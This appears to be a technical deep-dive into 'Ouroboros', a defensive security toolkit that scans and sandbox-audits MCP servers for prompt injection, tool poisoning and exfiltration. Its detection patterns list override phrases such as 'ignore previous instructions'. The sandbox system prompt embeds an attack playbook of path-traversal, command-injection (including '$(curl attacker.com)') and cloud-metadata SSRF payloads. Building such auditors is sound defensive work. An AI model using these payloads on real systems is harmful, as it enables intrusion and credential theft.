# Ouroboros Backend - Technical Deep Dive

This document explains how each backend feature actually works under the hood.

---

## Table of Contents

1. [Static Scanner (mcp_scanner)](#1-static-scanner-mcp_scanner)
2. [Runtime Engine (ouroboros_runtime)](#2-runtime-engine-ouroboros_runtime)
3. [Sandbox Auditor (ouroboros_sandbox)](#3-sandbox-auditor-ouroboros_sandbox)
4. [API Server (ouroboros_api)](#4-api-server-ouroboros_api)
5. [Real-time Monitor](#5-real-time-monitor)

---

## 1. Static Scanner (mcp_scanner)

### How It Works

The static scanner performs AST-based analysis without ever importing or executing target code.

#### Step 1: File Loading (`loader.py`)

```python
# Recursively finds all .py files and parses them into AST
parsed_files = load(target_path)
# Returns: list[ParsedFile] with tree (ast.Module) and source_lines
```

- Walks the directory tree looking for `*.py` files
- Parses each file with `ast.parse()` 
- Stores both the AST tree and raw source lines (for snippet extraction)
- Skips files that fail to parse (syntax errors)

#### Step 2: Registry Extraction (`registry.py`)

```python
# Extracts @mcp.tool and @mcp.resource decorated functions
registry = extract(parsed_files)
# Returns: ServerRegistry with tools[], resources[], servers[]
```

**How decorator detection works:**

1. Find all `FastMCP(...)` constructor calls to identify MCP variable names
2. Walk the AST looking for `FunctionDef` nodes
3. Check each decorator for patterns like `@mcp.tool()` or `@server.resource(...)`
4. Extract: function name, docstring, parameter names, AST node, source lines

```python
# Example: This function would be extracted as a ToolEntry
@mcp.tool()
def read_file(path: str) -> str:
    """Read a file from disk."""
    return open(path).read()
```

#### Step 3: Rule Execution (`engine.py`)

```python
# Two-pass rule engine
findings = []

# Pass 1: Run 9 standard rules
for rule_cls in ALL_RULES:
    rule = rule_cls()
    findings.extend(rule.analyze(registry))

# Pass 2: Meta-rule (needs prior findings)
meta = MultiVectorRule()
findings.extend(meta.analyze(registry, findings))
```

#### How Each Rule Works

| Rule | Detection Method |
|------|------------------|
| **prompt-injection** | Walks `registry.resources`, finds `ast.Return` nodes with `ast.JoinedStr` (f-strings) containing parameter names |
| **tool-poisoning** | Regex searches docstrings for coercive phrases: "you must", "ignore previous", "do not tell", etc. |
| **excessive-permissions** | Finds `ast.Call` to `open()`, `os.path.exists()`, etc. where arguments contain parameter names |
| **rug-pull** | Finds `ast.Assign` where target is `__doc__` attribute, or `ast.If` with state-dependent branching |
| **tool-shadowing** | Detects duplicate tool names, or docstrings mentioning other tool names |
| **indirect-prompt-injection** | Finds file write followed by file read (user content flows through file to LLM) |
| **token-leakage** | Finds `ast.Return` with f-strings containing names like "token", "key", "secret", "password" |
| **code-execution** | Finds `ast.Call` to `eval`, `exec`, `subprocess.*` where arguments contain parameter names |
| **command-injection** | Same as code-execution but requires `shell=True` and f-string argument |
| **multi-vector** | Groups findings by file, flags files with 3+ distinct rule violations |

#### Example: How tool-poisoning detection works

```python
# In tool_poisoning.py
COERCIVE_PATTERNS = [
    r"you must",
    r"do not mention",
    r"ignore previous",
    r"never reveal",
    # ... more patterns
]

def analyze(self, registry: ServerRegistry) -> list[Finding]:
    findings = []
    for tool in registry.tools:
        if tool.docstring:
            for pattern in COERCIVE_PATTERNS:
                if re.search(pattern, tool.docstring, re.IGNORECASE):
                    findings.append(Finding(
                        rule_id=RuleID.TOOL_POISONING,
                        severity=Severity.CRITICAL,
                        title=f"Coercive instruction in {tool.name}",
                        # ...
                    ))
    return findings
```

---

## 2. Runtime Engine (ouroboros_runtime)

### How It Works

The runtime engine validates external content before it enters an AI agent's context.

#### Core Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    RuntimeEngine                         │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ProbeInput ──▶ [Probe 1] ──▶ findings[]                │
│             ──▶ [Probe 2] ──▶ findings[]                │
│             ──▶ [Probe 3] ──▶ findings[]                │
│             ──▶ [Probe N] ──▶ findings[]                │
│                                                          │
│  All findings ──▶ compute_verdict() ──▶ RuntimeVerdict  │
│                                                          │
│  RuntimeVerdict ──▶ VerdictCache (LRU + TTL)            │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### Step 1: Create Probe Input

```python
input = ProbeInput(
    url="https://example.com",           # For URL scanning
    tool_name="web_search",              # For MCP tool responses
    tool_params={"query": "..."},        # Tool arguments
    response_body="...",                 # Content to analyze
    mcp_result={...},                    # Raw MCP response
)
```

#### Step 2: Run Probes

Each probe implements `BaseProbe.run(input) -> list[RuntimeFinding]`:

```python
class InjectionProbe(BaseProbe):
    probe_id = "injection"
    
    PATTERNS = [
        (r"ignore previous instructions", RuleID.PROMPT_INJECTION, Severity.HIGH),
        (r"disregard all prior", RuleID.PROMPT_INJECTION, Severity.HIGH),
        (r"you must not tell", RuleID.PROMPT_INJECTION, Severity.MEDIUM),
        # ... more patterns
    ]
    
    def run(self, input: ProbeInput) -> list[RuntimeFinding]:
        findings = []
        content = input.response_body or ""
        
        for pattern, rule_id, severity in self.PATTERNS:
            if re.search(pattern, content, re.IGNORECASE):
                findings.append(RuntimeFinding(
                    rule_id=rule_id,
                    severity=severity,
                    title="Prompt injection pattern detected",
                    evidence=f"Found: {pattern}",
                    target=input.url or input.tool_name,
                ))
        return findings
```

#### Available Probes

| Probe | What It Checks |
|-------|----------------|
| **ssl** | TLS certificate validity, expiration, hostname match |
| **headers** | Security headers (HSTS, CSP, X-Frame-Options, etc.) |
| **redirect** | Redirect chain, domain changes, certificate pinning |
| **injection** | Prompt injection patterns in content |
| **content** | Hidden text, invisible elements, encoded payloads |
| **exfiltration** | Canary token injection and leakage detection |
| **safebrowsing** | Google Safe Browsing API (malware/phishing) |
| **virustotal** | VirusTotal URL reputation |

#### Step 3: Compute Verdict

```python
def compute_verdict(findings, target, probe_duration_ms, reasoning_chain):
    if not findings:
        return RuntimeVerdict(verdict=Verdict.SAFE, ...)
    
    max_severity = max(f.severity for f in findings)
    
    if max_severity >= Severity.HIGH:
        return RuntimeVerdict(verdict=Verdict.BLOCK, ...)
    elif max_severity >= Severity.MEDIUM:
        return RuntimeVerdict(verdict=Verdict.CAUTION, ...)
    else:
        return RuntimeVerdict(verdict=Verdict.SAFE, ...)
```

#### Step 4: Cache Result

```python
# Content-hashed caching with TTL
cache_key = hashlib.sha256(
    f"{tool_name}:{json.dumps(tool_params)}:{response_body}".encode()
).hexdigest()

self._cache.put(cache_key, verdict, ttl=300)  # 5 minute TTL
```

### MCP Proxy (`proxy_stdio.py`)

The proxy wraps an MCP server and intercepts all traffic:

```
┌──────────┐     ┌─────────────────┐     ┌────────────┐
│  Client  │────▶│  StdioProxy     │────▶│ MCP Server │
│ (Claude) │◀────│                 │◀────│            │
└──────────┘     └────────┬────────┘     └────────────┘
                          │
                          ▼
                 ┌─────────────────┐
                 │   Interceptor   │
                 │                 │
                 │ on_request()   │──▶ Inject canary token
                 │ on_response()  │──▶ Run probes, enforce policy
                 └─────────────────┘
```

**Request interception:**
```python
def on_request(self, method, params, request_id):
    if method != "tools/call":
        return InterceptResult(action=PASS)
    
    # Inject canary token into params._meta.ouroboros_canary
    modified_params = self._canary.inject(params, request_id)
    return InterceptResult(action=PASS, modified_message=modified_params)
```

**Response interception:**
```python
def on_response(self, method, params, result, request_id):
    # Run all probes on response content
    verdict = self._engine.scan(ProbeInput(
        tool_name=params.get("name"),
        response_body=extract_text(result),
    ))
    
    # Check for canary leakage (cross-tool exfiltration)
    canary_finding = self._canary.check_leakage(response_body)
    
    # Apply policy
    enforcement = self._enforcer.enforce(verdict)
    
    if enforcement.action == BLOCK:
        return InterceptResult(action=BLOCK, error_response={...})
    return InterceptResult(action=PASS)
```

---

## 3. Sandbox Auditor (ouroboros_sandbox)

### How It Works

The sandbox runs an MCP server in a Docker container and uses an LLM agent to probe it.

#### Audit Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                        audit() function                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. STATIC SCAN                                                  │
│     └── mcp_scanner.scan(target_path) ──▶ static_findings[]     │
│                                                                  │
│  2. CONTAINER SETUP                                              │
│     └── ContainerManager.create(target_path)                    │
│     └── ContainerManager.start()                                │
│     └── NetworkMonitor.start()                                  │
│                                                                  │
│  3. AGENT PROBING LOOP                                          │
│     └── Bedrock Converse API with tool use                      │
│     └── Tools: list_tools, call_tool, read_file, etc.          │
│     └── Probes: injection, schema_drift, behavioral             │
│                                                                  │
│  4. REPORT GENERATION                                            │
│     └── Combine static + dynamic findings                       │
│     └── Compute overall verdict                                 │
│     └── Generate attack narrative                               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

#### Container Management

```python
class ContainerManager:
    def create(self, source_path: str):
        # 1. Create temp directory
        # 2. Copy source code into container
        # 3. Install dependencies (pip install -r requirements.txt)
        # 4. Configure network isolation
        
    def start(self):
        # Start the container with the MCP server
        self._container = self._client.containers.run(
            image=self._config.image,
            command=self._start_command,
            detach=True,
            network_mode="bridge",
            mem_limit=self._config.memory_limit,
        )
        
    def exec_command(self, command: str) -> str:
        # Execute command inside container
        exit_code, output = self._container.exec_run(command)
        return output.decode()
```

#### Agent Tools

The LLM agent has these tools available:

| Tool | Purpose |
|------|---------|
| `list_files` | List files in the container |
| `read_file` | Read file contents |
| `get_tool_schemas` | Get MCP tool definitions via `tools/list` |
| `call_mcp_tool` | Call an MCP tool with arguments |
| `check_network` | Get network activity log |

```python
# Tool dispatch
def dispatch_sandbox_tool(tool_use: dict, context: SandboxToolContext) -> dict:
    name = tool_use["name"]
    input = tool_use.get("input", {})
    
    if name == "call_mcp_tool":
        # Actually call the MCP tool inside the container
        result = context.mcp_client.call_tool(
            input["tool_name"],
            input.get("arguments", {})
        )
        return {"toolResultId": ..., "content": [{"json": result}]}
```

#### Adversarial Probing

The system prompt includes an adversarial playbook:

```python
SANDBOX_SYSTEM_PROMPT = """
You are a security auditor. Your goal is to find vulnerabilities.

## Adversarial Probing Playbook

For FILE OPERATIONS (read_file, write_file, etc.):
- Try path traversal: "../../../etc/passwd", "....//....//etc/passwd"
- Try absolute paths: "/etc/passwd", "/root/.ssh/id_rsa"
- Try null bytes: "file.txt\x00.jpg"

For COMMAND EXECUTION (execute_code, run_command, etc.):
- Try command injection: "; cat /etc/passwd", "| whoami", "`id`"
- Try shell metacharacters: "$(/bin/sh)", "$(curl attacker.com)"

For URL/NETWORK tools:
- Try SSRF: "http://169.254.169.254/latest/meta-data/"
- Try internal IPs: "http://127.0.0.1:22", "http://localhost:6379"
"""
```

#### Tool Risk Scoring

Before probing, tools are automatically scored by name/description:

```python
DANGEROUS_TOOL_PATTERNS = {
    "execute": (Severity.CRITICAL, "Code execution capability"),
    "eval": (Severity.CRITICAL, "Code execution capability"),
    "shell": (Severity.CRITICAL, "Shell access"),
    "command": (Severity.HIGH, "Command execution"),
    "write": (Severity.HIGH, "File write capability"),
    "delete": (Severity.HIGH, "File deletion capability"),
    "sql": (Severity.MEDIUM, "Database access"),
}

def score_tool_schemas(tools: list[dict]) -> list[RuntimeFinding]:
    findings = []
    for tool in tools:
        name = tool.get("name", "").lower()
        desc = tool.get("description", "").lower()
        
        for pattern, (severity, reason) in DANGEROUS_TOOL_PATTERNS.items():
            if pattern in name or pattern in desc:
                findings.append(RuntimeFinding(
                    rule_id=RuleID.DANGEROUS_CAPABILITY,
                    severity=severity,
                    title=f"Dangerous tool: {tool['name']}",
                    description=reason,
                ))
    return findings
```

#### Dynamic Iteration Budget

The iteration budget scales with the number of tools discovered:

```python
DEFAULT_BASE_ITERATIONS = 5
ITERATIONS_PER_TOOL = 3

# When tools are discovered:
if tool_name == "get_tool_schemas":
    discovered_tools = result.get("tools", [])
    new_budget = DEFAULT_BASE_ITERATIONS + (len(discovered_tools) * ITERATIONS_PER_TOOL)
    # e.g., 8 tools = 5 + (8 * 3) = 29 iterations
```

---

## 4. API Server (ouroboros_api)

### How It Works

FastAPI backend with REST endpoints, SSE streaming, and WebSocket support.

#### Job Management

All long-running operations use a job-based pattern:

```python
# In-memory job store
class JobStore:
    def __init__(self):
        self._jobs: dict[str, Job] = {}
    
    def create(self, job_id: str) -> Job:
        job = Job(id=job_id, status=JobStatus.PENDING)
        self._jobs[job_id] = job
        return job

# Three job stores
scan_jobs = JobStore()      # Static scans
audit_jobs = JobStore()     # Sandbox audits
runtime_scan_jobs = JobStore()  # URL scans
```

#### SSE Streaming

Events are streamed to the frontend in real-time:

```python
@app.get("/api/audit/{job_id}/stream")
async def stream_audit(job_id: str):
    job = audit_jobs.get(job_id)
    
    async def event_generator():
        while True:
            # Check for new events in job.events queue
            while job.events:
                event = job.events.pop(0)
                yield {
                    "event": event["type"],
                    "data": json.dumps(event["data"])
                }
            
            if job.status in (JobStatus.COMPLETED, JobStatus.FAILED):
                yield {"event": "complete", "data": "{}"}
                break
            
            await asyncio.sleep(0.1)
    
    return EventSourceResponse(event_generator())
```

#### Background Tasks

Long-running operations run in background tasks:

```python
@app.post("/api/audit")
async def start_audit(request: AuditRequest, background_tasks: BackgroundTasks):
    job_id = str(uuid.uuid4())
    job = audit_jobs.create(job_id)
    
    # Run audit in background
    background_tasks.add_task(_run_audit_job, job, request)
    
    return AuditResponse(job_id=job_id, status=JobStatus.RUNNING)

async def _run_audit_job(job: Job, request: AuditRequest):
    # Event callback to stream progress
    async def emit_event(event_type: str, data: dict):
        job.events.append({"type": event_type, "data": data})
    
    try:
        report = await audit(
            target_path=request.target,
            event_callback=emit_event,
        )
        job.result = report.to_dict()
        job.status = JobStatus.COMPLETED
    except Exception as e:
        job.error = str(e)
        job.status = JobStatus.FAILED
```

---

## 5. Real-time Monitor

### How It Works

WebSocket-based real-time monitoring of MCP traffic.

#### Event Bus Architecture

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│   MCP Proxy     │────▶│  MonitorEventBus │────▶│  WebSocket      │
│                 │     │                  │     │  Clients        │
│ emit_event()    │     │  publish()       │     │                 │
└─────────────────┘     │  subscribe()     │     │  Frontend x N   │
                        │  get_history()   │     │                 │
┌─────────────────┐     │                  │     └─────────────────┘
│   Test Script   │────▶│                  │
│                 │     └──────────────────┘
│ POST /emit      │
└─────────────────┘
```

#### Event Bus Implementation

```python
class MonitorEventBus:
    def __init__(self):
        self._subscribers: list[asyncio.Queue] = []
        self._history: list[MonitorEvent] = []
    
    async def publish(self, event: MonitorEvent):
        # Add to history
        self._history.append(event)
        
        # Broadcast to all subscribers
        for queue in self._subscribers:
            queue.put_nowait(event)
    
    async def subscribe(self) -> AsyncIterator[MonitorEvent]:
        queue = asyncio.Queue()
        self._subscribers.append(queue)
        
        try:
            while True:
                event = await queue.get()
                yield event
        finally:
            self._subscribers.remove(queue)
```

#### WebSocket Endpoint

```python
@app.websocket("/api/monitor/ws")
async def monitor_websocket(websocket: WebSocket):
    await websocket.accept()
    
    # Send history first
    for event in monitor_bus.get_history():
        await websocket.send_json({
            "type": event.type,
            "data": event.data,
        })
    
    # Stream new events
    async for event in monitor_bus.subscribe():
        await websocket.send_json({
            "type": event.type,
            "data": event.data,
        })
```

#### Event Types

| Event | When Emitted | Data |
|-------|--------------|------|
| `call_start` | MCP tool call begins | `{id, target, targetType, toolName, timestamp}` |
| `probe_result` | Probe completes | `{id, probe, duration_ms, findings[], detail[]}` |
| `escalation_start` | LLM analysis begins | `{id}` |
| `escalation_chunk` | LLM streams text | `{id, text}` |
| `escalation_end` | LLM analysis ends | `{id, duration_ms}` |
| `verdict` | Final verdict | `{id, verdict: RuntimeVerdict}` |

#### Proxy Integration

The MCP proxy emits events via HTTP:

```python
class MonitorEmitter:
    async def emit(self, event_type: str, data: dict):
        async with self._session.post(
            f"{self._api_url}/api/monitor/emit",
            json={"type": event_type, "data": data},
        ) as resp:
            pass

# In proxy_stdio.py
async def _handle_client_message(self, message: str):
    # Emit call_start
    await self._emitter.emit("call_start", {
        "id": call_id,
        "target": tool_name,
        "targetType": "mcp",
        "toolName": tool_name,
        "timestamp": datetime.utcnow().isoformat(),
    })
    
    # ... process message ...
    
    # Emit verdict
    await self._emitter.emit("verdict", {
        "id": call_id,
        "verdict": verdict_dict,
    })
```

---

## Summary

| Component | Core Technology | Key Insight |
|-----------|-----------------|-------------|
| **mcp_scanner** | Python AST | Never executes code, pure static analysis |
| **ouroboros_runtime** | Probe pipeline | Content-hashed caching, policy enforcement |
| **ouroboros_sandbox** | Docker + Bedrock | LLM agent with adversarial playbook |
| **ouroboros_api** | FastAPI + SSE | Job-based async with real-time streaming |
| **Monitor** | WebSocket | Event bus pattern for multi-client broadcast |
